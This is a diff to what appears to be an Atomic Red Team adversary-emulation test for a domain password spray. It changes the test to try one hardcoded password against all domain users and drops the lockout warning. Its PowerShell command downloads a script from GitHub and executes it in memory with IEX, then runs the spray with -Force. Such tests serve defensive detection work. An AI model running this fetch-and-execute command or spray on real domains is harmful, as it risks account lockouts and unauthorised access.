@@ -38,9 +38,7 @@ atomic_tests:
 
 - name: Password Spray (DomainPasswordSpray)
   description: |
-    Perform a domain password spray using the DomainPasswordSpray tool. By default, the password list only has one password. This is to
-    prevent account lockouts. Replace it with a list that has more passwords if you're sure it won't cause damage. The script will wait for the AD account lockout
-    period before trying each password, so a long password list could take hours to days. Upon execution, information about the password spray will be displayed.
+    Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
     
     https://github.com/dafthack/DomainPasswordSpray
 
@@ -48,14 +46,14 @@ atomic_tests:
     - windows
 
   input_arguments:
-    passwords_file:
-      description: Path to a file containing a list of passwords we will attempt to brute force with
-      type: Path
-      default: PathToAtomicsFolder\T1110\src\passwords.txt
+    domain:
+      description: Domain to brute force against
+      type: String
+      default: (Get-ADDomain | Select-Object -ExpandProperty Name)
     
   executor:
     name: powershell
     elevation_required: false
     command: |
-      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -PasswordList #{passwords_file} -Force
+      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
 
